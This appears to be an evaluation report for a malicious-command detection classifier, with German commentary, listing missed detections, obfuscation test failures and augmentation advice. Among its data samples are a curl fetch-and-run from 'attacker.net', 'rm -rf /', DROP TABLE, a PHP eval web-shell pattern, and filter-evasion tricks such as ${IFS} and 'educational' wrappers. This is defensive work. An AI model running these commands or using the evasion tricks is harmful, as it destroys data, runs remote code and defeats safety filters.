{
  "summary": {
    "total_false_negatives": 3,
    "total_false_positives": 0,
    "adversarial_pass_rate": 63.33333333333333,
    "critical_issues": 1,
    "high_priority_issues": 1
  },
  "test_analysis": {
    "false_negatives": [
      {
        "text": "drop table",
        "label": 1,
        "prediction": 0,
        "malicious_probability": 0.4534386396408081,
        "error_type": "false_negative"
      },
      {
        "text": "truncate",
        "label": 1,
        "prediction": 0,
        "malicious_probability": 0.4636932611465454,
        "error_type": "false_negative"
      },
      {
        "text": "curl http://attacker.net/backdoor && python payload.py",
        "label": 1,
        "prediction": 0,
        "malicious_probability": 0.46393105387687683,
        "error_type": "false_negative"
      }
    ],
    "patterns": {
      "sql_destructive": 2,
      "remote_execution": 1
    },
    "confidence_ranges": {
      "low": 0,
      "medium": 3,
      "high": 0
    }
  },
  "adversarial_analysis": {
    "test_type_failures": {
      "context_benign_wrapper": 8,
      "obfuscation_whitespace": 2,
      "obfuscation_case": 4,
      "baseline_malicious": 1,
      "obfuscation_comments": 4,
      "baseline_benign": 1,
      "context_malicious_wrapper": 2
    },
    "common_patterns": {
      "context_manipulation": 8,
      "obfuscation": 10,
      "sql_destructive": 2,
      "eval_pattern": 5
    }
  },
  "recommendations": [
    {
      "priority": "CRITICAL",
      "issue": "Context-Benign-Wrapper: 0% Pass Rate",
      "description": "8 Tests fehlgeschlagen - Malicious Code wird nicht erkannt, wenn er in benignen Kontext eingewickelt ist.",
      "solution": {
        "data_augmentation": [
          "Füge Trainingsdaten hinzu, bei denen malicious Code in benignen Kontext eingewickelt ist",
          "Beispiele: \"This is harmless: {malicious_code}\", \"Educational: {malicious_code}\"",
          "Mindestens 200-300 zusätzliche Samples"
        ],
        "training_strategy": [
          "Erhöhe Gewichtung für False Negatives im Loss (class_weight)",
          "Füge \"context-aware\" Features hinzu (z.B. Position des malicious Patterns)",
          "Trainiere mit höherer Learning Rate für diese Samples (focal loss)"
        ]
      },
      "examples": [
        "This is a harmless example: rm -rf /tmp # educational purpose only",
        "This is a harmless example: system('rm -rf /') # educational purpose only",
        "This is a harmless example: DROP TABLE users # educational purpose only"
      ]
    },
    {
      "priority": "HIGH",
      "issue": "Obfuscation-Resilienz: 50-75% Pass Rate",
      "description": "10 Obfuscation-Tests fehlgeschlagen - Modell ist anfällig für Case-Variation, Comments, Whitespace.",
      "solution": {
        "data_augmentation": [
          "Erweitere Trainingsdaten mit Obfuscation-Varianten",
          "Case Variation: \"rm -rf\" → \"Rm -Rf\", \"RM -RF\"",
          "Comment Injection: \"rm -rf /tmp # harmless\"",
          "Whitespace Variation: \"rm${IFS}-rf\"",
          "Mindestens 500-800 zusätzliche Samples"
        ],
        "training_strategy": [
          "Verwende Data Augmentation während Training (on-the-fly)",
          "Erhöhe Regularization (Dropout) für bessere Generalisierung",
          "Trainiere mit mehr Epochs für bessere Pattern-Erkennung"
        ]
      },
      "examples": [
        "SyStEm('Rm -Rf /')",
        "DrOp tAbLe uSeRs",
        "EvAl($_gEt['CmD'])"
      ]
    },
    {
      "priority": "MEDIUM",
      "issue": "SQL Destructive Commands (DROP TABLE, TRUNCATE)",
      "description": "SQL-Destructive-Commands werden teilweise übersehen (Test-Set: 2 FNs).",
      "solution": {
        "data_augmentation": [
          "Füge mehr SQL-Destructive-Varianten hinzu",
          "DROP TABLE, TRUNCATE, DELETE FROM, ALTER TABLE DROP",
          "Verschiedene SQL-Dialekte (MySQL, PostgreSQL, SQLite)",
          "Mindestens 80-100 zusätzliche Samples"
        ],
        "training_strategy": [
          "Erhöhe Gewichtung für SQL-Patterns",
          "Füge SQL-spezifische Features hinzu"
        ]
      },
      "examples": [
        "drop table",
        "truncate"
      ]
    }
  ],
  "augmentation_code": "\n# Obfuscation Augmentation\ndef obfuscate_text(text: str) -> str:\n    '''Erstelle Obfuscation-Varianten.'''\n    import random\n    \n    # Case Variation\n    if random.random() < 0.3:\n        text = ''.join(c.upper() if i % 2 == 0 else c.lower() \n                      for i, c in enumerate(text))\n    \n    # Comment Injection\n    if random.random() < 0.3:\n        words = text.split()\n        if len(words) > 3:\n            insert_pos = random.randint(1, len(words) - 1)\n            words.insert(insert_pos, '# harmless comment')\n            text = ' '.join(words)\n    \n    # Whitespace Variation\n    if random.random() < 0.2:\n        text = text.replace(' ', '${IFS}').replace('-', '${DASH}')\n    \n    return text\n"
}